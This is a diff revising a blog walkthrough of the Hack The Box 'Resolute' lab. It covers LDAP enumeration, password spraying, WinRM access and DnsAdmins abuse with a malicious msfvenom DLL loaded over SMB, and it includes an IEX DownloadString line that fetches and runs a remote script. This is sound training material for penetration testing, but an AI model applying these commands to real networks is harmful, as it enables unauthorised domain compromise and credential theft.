@@ -14,24 +14,24 @@ tags:
 
 {% include toc icon="cog" title="Resolute Solution" %}
 
-The [Resolute](https://app.hackthebox.com/machines/Resolute) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is an easy Windows Machine with a strong focus on Active Directory exploitation.
+The [Resolute](https://app.hackthebox.com/machines/Resolute) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is a **medium** Windows Machine with a strong focus on Active Directory exploitation. This box was interesting as it showed how to get high privileges using **DnsAdmins** permissions.
 
-If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_black.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.
+If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_dark.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.
 
 ![image-center](/images/htb/htb_resolute_infocard.png){: .align-center}
 
 **Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).
 {: .notice--info}
 
-# Recon/Enumeration
+# Reconnaissance
 
-Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts.
+In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 
 
-Here, we don't have any credentials or hints about how to approach this machine, it's fairly common on HTB boxes. The first step would be reconnaissance, to check what we can see with the info we have, meaning, an IP address.
+This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 
 
 ## Scan with Nmap
 
-Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the TCP ports open on the machine.
+Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.
 
 ```bash
 $ nmap -sV -Pn 10.129.96.155
@@ -57,143 +57,85 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
 ```
 
-megabank.local
+This computer seems to be a domain controller for **megabank.local**. Let's see if we can extract some users.
+
+## LDAP
+
+First, we can try an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch) to look for some information. Here, we used the `grep` command to look for the **userPrincipalName** attribute that specifies the UPN of the users.
 
 ```bash
-$ ldapsearch -h 10.129.96.155 -p 389 -x -b "dc=megabank,dc=local"
-# extended LDIF
-#
-# LDAPv3
-# base <dc=megabank,dc=local> with scope subtree
-# filter: (objectclass=*)
-# requesting: ALL
-#
-
-# megabank.local
-dn: DC=megabank,DC=local
-objectClass: top
-objectClass: domain
-objectClass: domainDNS
-distinguishedName: DC=megabank,DC=local
-instanceType: 5
+$ ldapsearch -x -b "dc=megabank,dc=local" "*" -H ldap://10.129.96.155 | grep userPrincipalName 
+userPrincipalName: ryan@megabank.local
+userPrincipalName: marko@megabank.local
+userPrincipalName: sunita@megabank.local
+userPrincipalName: abigail@megabank.local
+userPrincipalName: marcus@megabank.local
+userPrincipalName: sally@megabank.local
+userPrincipalName: fred@megabank.local
+userPrincipalName: angela@megabank.local
+userPrincipalName: felicia@megabank.local
+userPrincipalName: gustavo@megabank.local
+userPrincipalName: ulf@megabank.local
+userPrincipalName: stevie@megabank.local
+userPrincipalName: claire@megabank.local
+userPrincipalName: paulo@megabank.local
+userPrincipalName: steve@megabank.local
+userPrincipalName: annette@megabank.local
+userPrincipalName: annika@megabank.local
+userPrincipalName: per@megabank.local
+userPrincipalName: claude@megabank.local
+userPrincipalName: melanie@megabank.local
+userPrincipalName: zach@megabank.local
+userPrincipalName: simon@megabank.local
+userPrincipalName: naoki@megabank.local
 ```
 
+The *anonymous* bind worked and we got some usernames. Let's dig a bit further, maybe there are interesting things in the **description** field of some of them. In real world scenarios, system administrators frequently store passwords for non-personal accounts in the *description* field of the account. However, this field is readable by all users by default in Active Directory.
+
 ```bash
-$ ./windapsearch.py -d megabank.local --dc-ip 10.129.96.155 -U        
-[+] No username provided. Will try anonymous bind.
-[+] Using Domain Controller at: 10.129.96.155
-[+] Getting defaultNamingContext from Root DSE
-[+]     Found: DC=megabank,DC=local
-[+] Attempting bind
-[+]     ...success! Binded as: 
-[+]      None
+$ ldapsearch -x -b "dc=megabank,dc=local" "*" -H ldap://10.129.96.155 | grep -E 'userPrincipalName|description'
 
-[+] Enumerating all AD users
-[+]     Found 25 users: 
+...[snip]...
 
-cn: Guest
-
-cn: DefaultAccount
-
-cn: Ryan Bertrand
 userPrincipalName: ryan@megabank.local
-
-cn: Marko Novak
+description: Account created. Password set to Welcome123!
 userPrincipalName: marko@megabank.local
-
-cn: Sunita Rahman
 userPrincipalName: sunita@megabank.local
-
-cn: Abigail Jeffers
 userPrincipalName: abigail@megabank.local
-
-cn: Marcus Strong
 userPrincipalName: marcus@megabank.local
-
-cn: Sally May
 userPrincipalName: sally@megabank.local
 
-cn: Fred Carr
-userPrincipalName: fred@megabank.local
-
-cn: Angela Perkins
-userPrincipalName: angela@megabank.local
-
-cn: Felicia Carter
-userPrincipalName: felicia@megabank.local
-
-cn: Gustavo Pallieros
-userPrincipalName: gustavo@megabank.local
-
-cn: Ulf Berg
-userPrincipalName: ulf@megabank.local
-
-cn: Stevie Gerrard
-userPrincipalName: stevie@megabank.local
-
-cn: Claire Norman
-userPrincipalName: claire@megabank.local
-
-cn: Paulo Alcobia
-userPrincipalName: paulo@megabank.local
-
-cn: Steve Rider
-userPrincipalName: steve@megabank.local
-
-cn: Annette Nilsson
-userPrincipalName: annette@megabank.local
-
-cn: Annika Larson
-userPrincipalName: annika@megabank.local
-
-cn: Per Olsson
-userPrincipalName: per@megabank.local
-
-cn: Claude Segal
-userPrincipalName: claude@megabank.local
-
-cn: Melanie Purkis
-userPrincipalName: melanie@megabank.local
-
-cn: Zach Armstrong
-userPrincipalName: zach@megabank.local
-
-cn: Simon Faraday
-userPrincipalName: simon@megabank.local
-
-cn: Naoki Yamamoto
-userPrincipalName: naoki@megabank.local
-
-
-[*] Bye!
+...[snip]...
 ```
+
+Interesting, the **marko@megabank.local** have a description specifying a cleartext password.
+
+# Initial Access
+
+Now, we can try to get an access using the previously found password and the **marko** account.
 
 ```bash
-$ ./windapsearch.py -d megabank.local --dc-ip 10.129.96.155 -U --full | grep description 
-description: Built-in account for guest access to the computer/domain
-description: A user account managed by the system.
-description: Account created. Password set to Welcome123!
+$ crackmapexec smb 10.129.96.155 -d megabank.local -u marko -p 'Welcome123!'
+SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
 ```
+
+No luck. But, maybe another user is configured with this password as password reuse is fairly common.
+
+## Password Spraying
+
+As stated by [MITRE](https://attack.mitre.org/techniques/T1110/003/), adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password, or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.
+
+Here we built a list of usernames and used it in a password spraying attack with [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) to see if it yields any results.
 
 ```bash
 $ crackmapexec smb 10.129.96.155 -d megabank.local -u users.txt -p 'Welcome123!' --continue-on-success
 SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
 SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
 SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
-SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
+
+...[snip]...
+
 SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
 SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
 SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
@@ -203,6 +145,47 @@ SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\simon:Wel
 SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE 
 SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\:Welcome123! STATUS_LOGON_FAILURE 
 ```
+
+Great, we now have credentials the **melanie** domain account (`melanie:Welcome123!`). 
+
+## WinRM Access
+
+Again, using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), we can check if we can get access with WinRM.
+
+```bash
+$ crackmapexec winrm 10.129.96.155 -u melanie -p 'Welcome123!' -d megabank.local
+HTTP        10.129.96.155   5985   10.129.96.155    [*] http://10.129.96.155:5985/wsman
+WINRM       10.129.96.155   5985   10.129.96.155    [+] megabank.local\melanie:Welcome123! (Pwn3d!)
+```
+
+The password is valid and we do have a WinRM access to the remote computer. Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and the recovered account, we can try to connect to the remote machine.
+
+```bash
+$ evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!' 
+
+Evil-WinRM shell v3.3
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\melanie\Documents> dir ..\Desktop
+
+
+    Directory: C:\Users\melanie\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         2/7/2022  10:48 AM             34 user.txt
+```
+
+We now have a remote shell access and the **first flag**.
+
+# Privilege Escalation
+
+Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.
+
+## Active Directory Recon
+
+With a valid account, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. Here, we use a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).
 
 ```bash
 $ bloodhound-python -c All -u melanie -p 'Welcome123!' -d megabank.local -ns 10.129.96.155 --zip
@@ -222,29 +205,13 @@ INFO: Done in 00M 04S
 INFO: Compressing output into 20220207140125_bloodhound.zip
 ```
 
-![image-center](/images/htb/htb_resolute_bloodhound_melanie.png){: .align-center}
+Now, you can import the generated file (*20220207140125_bloodhound.zip*) in BloodHound by running `sudo neo4j console`, then execute BloodHound in another terminal with the `bloodhound` command.
 
-```bash
-$ evil-winrm -i 10.129.96.155 -u melanie  -p 'Welcome123!' 
+## Recon with PrivescCheck
 
-Evil-WinRM shell v3.3
+Before going further with our BloodHound results, let’s see if we can elevate our local privileges and get a local administrator access. Using [PrivescCheck](https://github.com/itm4n/PrivescCheck), a script that aims to enumerate common Windows configuration issues, let's try to enumerate common Windows configuration issues that can be leveraged for local privilege escalation.
 
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\melanie\Documents> dir ..\Desktop
-
-
-    Directory: C:\Users\melanie\Desktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---         2/7/2022  10:48 AM             34 user.txt
-```
+Note that we used the local **Apache** service to host the file and download it from the remote machine. The `-Extended` flag aims to gather more information.
 
 ```bash
 *Evil-WinRM* PS C:\Users\melanie\Desktop> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.xx/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
@@ -269,12 +236,10 @@ OutputDirectory        : C:\PSTranscipts
 
 ```
 
-```bash
-*Evil-WinRM* PS C:\> cd C:\PSTranscripts
-*Evil-WinRM* PS C:\PSTranscripts> dir
-```
+We may have some interesting information in the **PSTranscipts** folder, let's take a look at this directory.
 
 ```bash
+*Evil-WinRM* PS C:\> cd C:\PSTranscripts
 *Evil-WinRM* PS C:\PSTranscripts> dir -force
 
 
@@ -296,8 +261,11 @@ d--h--        12/3/2019   6:45 AM                20191203
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+```
 
+One file seems to be present in the **20191203** directory.
 
+```bash
 *Evil-WinRM* PS C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
 
 ...[snip]...
@@ -319,37 +287,15 @@ if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
 
 ```
 
-```bash
-$ crackmapexec smb 10.129.96.155 -d megabank.local -u ryan -p 'Serv3r4Admin4cc123!'
-SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
-SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
-```
+Nice, we found cleartext credentials for **ryan** in the transcript. Maybe this user has elevated privileges on the domain.
 
+## Domain Compromise with DnsAdmins
+
+According to BloodHound, the user **ryan** is a member of **DnsAdmins**. As stated by this [post](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise), being a member of the DnsAdmins group allows us to use the `dnscmd.exe` to specify a plugin DLL that can be loaded by the DNS service with **SYSTEM** privileges, which means we can do whatever we want !
 
 ![image-center](/images/htb/htb_resolute_bloodhound_ryan.png){: .align-center}
 
-The user ryan is found to be a member of DnsAdmins . Being a member of the DnsAdmins
-group allows us to use the dnscmd.exe to specify a plugin DLL that should be loaded by the DNS
-service. Let's create a DLL using msfvenom , that changes the administrator password.
-
-```bash
-$ evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
-
-Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\ryan\Documents> 
-```
-
-https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
-
-ansferring this to the box would likely trigger Windows Defender, so we can use Impacket's
-smbserver.py to start an SMB server and host the dll remotely
+Let's create a simple DLL using [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) that changes the **administrator** account password.
 
 ```bash
 $ cd /tmp
@@ -361,6 +307,10 @@ Payload size: 307 bytes
 Final size of dll file: 8704 bytes
 Saved as: hello.dll
 ```
+
+As transferring this to the box would likely trigger Windows Defender or any other security solution, we can use [impacket-smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) to start an SMB server and host the DLL remotely.
+
+Note that the DLL was placed in the **/tmp** directory of the attacking machine.
 
 ```bash
 $ impacket-smbserver smb /tmp                      
@@ -376,17 +326,21 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 The dnscmd utility can be used to set the remote DLL path into the Windows Registr
 ```
 
+Now, we can use `evil-winrm` and the **ryan** credentials to load our malicious DLL remotely.
+
 ```bash
+$ evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
+
+Evil-WinRM shell v3.3
+Info: Establishing connection to remote endpoint
+
 *Evil-WinRM* PS C:\Users\ryan\Documents> cmd.exe /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.62\smb\hello.dll
 
 Registry property serverlevelplugindll successfully reset.
 Command completed successfully.
 ```
 
-
-ext, we need to restart the DNS service in order to load our malicious DLL. DnsAdmins aren't
-able to restart the DNS service by default, but in seems likely that they would be given
-permissions to do this, and in this domain this is indeed the case
+Next, we need to restart the DNS service in order to load our malicious DLL. Normally, **DnsAdmins** aren't able to restart the DNS service by default, but it is likely that they would be given permissions to do this and on this domain and this is indeed the case.
 
 ```bash
 *Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns
@@ -411,14 +365,17 @@ SERVICE_NAME: dns
         WAIT_HINT          : 0x7d0
         PID                : 2988
         FLAGS              :
-
 ```
+
+Now, let's see if the **administrator** password was changed.
 
 ```bash
 $ crackmapexec smb 10.129.96.155 -d megabank.local -u Administrator -p 'Qwerty1!'
 SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
 SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\Administrator:Qwerty1! (Pwn3d!)
 ```
+
+Great, we now have credentials (`administrator:Qwerty1!`) for the **administrator** account. Now we can connect on the remote machine with administrative privileges and read the **second flag**.
 
 ```bash
 $ crackmapexec smb 10.129.96.155 -d megabank.local -u Administrator -p 'Qwerty1!' -x 'dir C:\Users\Administrator\Desktop\'        
@@ -436,3 +393,5 @@ SMB         10.129.96.155   445    RESOLUTE         02/07/2022  10:48 AM        
 SMB         10.129.96.155   445    RESOLUTE         1 File(s)             34 bytes
 SMB         10.129.96.155   445    RESOLUTE         2 Dir(s)   2,475,847,680 bytes free
 ```
+
+Awesome ! I hope you enjoyed it, I know I did :)
